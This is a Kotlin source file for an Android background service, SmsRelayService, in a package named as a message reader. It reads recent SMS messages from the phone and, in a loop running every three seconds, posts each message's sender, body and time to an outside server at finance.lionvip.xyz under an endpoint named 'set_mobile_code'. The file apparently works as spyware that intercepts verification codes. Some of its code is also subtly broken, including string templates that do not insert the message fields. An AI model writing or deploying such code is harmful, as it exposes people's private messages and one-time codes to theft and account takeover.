package com.example.messagereader

import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.database.Cursor
import android.os.Binder
import android.os.IBinder
import android.provider.Telephony
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.InternalCoroutinesApi
import kotlinx.coroutines.internal.synchronized
import okhttp3.MediaType
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException
import org.greenrobot.eventbus.EventBus
import org.greenrobot.eventbus.Subscribe
import org.json.JSONException
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date


class SmsRelayService : Service() {
    private val TAG = "SmsRelayService"

    private val dbLock = Object()
    private var mBinder = SmsBinder()
    private var thread: Thread? = null

    override fun onBind(intent: Intent): IBinder {
        return mBinder
    }

    @OptIn(InternalCoroutinesApi::class)
    override fun onCreate() {
        super.onCreate()

        EventBus.getDefault().register(this)
        thread = Thread {
            while (true) {
                Thread.sleep(3000)

                val sp = App.getContext().getSharedPreferences("config", AppCompatActivity.MODE_PRIVATE)
                val deviceSerial = sp.getString("DeviceSerial", "")
                if (deviceSerial.isNullOrEmpty()) {
                    continue
                }
                synchronized(dbLock) {
                    val list = SmsRepository.getInstance().getFromSendStatus(0)
                    list.forEach {
                        report(deviceSerial, it)
                    }
                }
            }
        }
        thread!!.start()
    }

    private fun report(deviceSerial: String, sms: SmsItem): Int {
        val client = OkHttpClient()
        val body = "{\"mobile\":\"${deviceSerial}\", \"code\":{\"phone\":\"$sms.number\", \"body\":\"$sms.body\", \"receiveTime\":\"$sms.receiveTime\"}}".toRequestBody(JSON)
        val request = Request.Builder()
            .url("https://finance.lionvip.xyz/api/sys/set_mobile_code")
            .post(body)
            .build()
        var status = 0
        try {
            val response = client.newCall(request).execute()
            val jsonString = response.body.toString()
            response.close()
            val jsonObject = JSONObject(jsonString)
            if (jsonObject["success"] == "true") {
                status = 1
            }
        } catch (_: IOException) {

        } catch (_: JSONException) {

        } finally {

        }
        return status
    }

    override fun onDestroy() {
        super.onDestroy()
        EventBus.getDefault().unregister(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return super.onStartCommand(intent, flags, startId)
    }

    @Subscribe(sticky = true)
    fun handleEvent(event: SmsReceiver.NewSmsEvent) {
        getSmsFromPhone()

        // val className = this.javaClass.simpleName
        // val message = "#handleEvent: called for " + event.javaClass.simpleName
        // Toast.makeText(this, className + message, Toast.LENGTH_SHORT).show()
        // Log.d(className, message)

        // prevent event from re-delivering, like when leaving and coming back to app
        EventBus.getDefault().removeStickyEvent(event)
    }

    inner class SmsBinder : Binder() {
        @Throws(InterruptedException::class)
        fun readSms() {
            getSmsFromPhone()
        }
    }

    companion object {
        val JSON: MediaType = "application/json; charset=utf-8".toMediaType()
    }

    @OptIn(InternalCoroutinesApi::class)
    @SuppressLint("Range", "Recycle", "SimpleDateFormat")
    private fun getSmsFromPhone() {
        val cr = contentResolver
        val projection = arrayOf(
            Telephony.Sms._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.READ,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE,
        )
        val last4hour = (System.currentTimeMillis() - 4 * 60 * 60 * 1000).toString()
        val cur: Cursor? = cr.query(Telephony.Sms.CONTENT_URI, projection, "${Telephony.Sms.DATE} > ?", arrayOf(last4hour), Telephony.Sms.DEFAULT_SORT_ORDER)
        Log.i(TAG, "---------getSmsFromPhone")

        if (null == cur) {
            Log.e(TAG, "读取短信出错")
            return
        }
        val sp = App.getContext().getSharedPreferences("config", AppCompatActivity.MODE_PRIVATE)
        val deviceSerial = sp.getString("DeviceSerial", "")
        if (deviceSerial.isNullOrEmpty()) {
            return
        }
        synchronized(dbLock) {
            while (cur.moveToNext()) {
                val id = cur.getInt(cur.getColumnIndex(Telephony.Sms._ID))
                val number = cur.getString(cur.getColumnIndex(Telephony.Sms.ADDRESS)) // 手机号
                val read = cur.getInt(cur.getColumnIndex(Telephony.Sms.READ)) == 1
                val body = cur.getString(cur.getColumnIndex(Telephony.Sms.BODY))
                val timestamp = cur.getLong(cur.getColumnIndex(Telephony.Sms.DATE))
                val type = cur.getShort(cur.getColumnIndex(Telephony.Sms.TYPE))

                val date = Date(timestamp) // 时间
                val format = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                val receiveTime: String = format.format(date)

                Log.i(
                    TAG,
                    "---------getSmsFromPhone  ${id}, ${number}, read: $read, ${body}, ${receiveTime}, $type"
                )

                var item = SmsRepository.getInstance().get(id)
                if (item == null) {
                    item = SmsItem(id, number, body, timestamp, 0)
                    SmsRepository.getInstance().insert(item)
                }
            }
        }
        cur.close()
    }
}
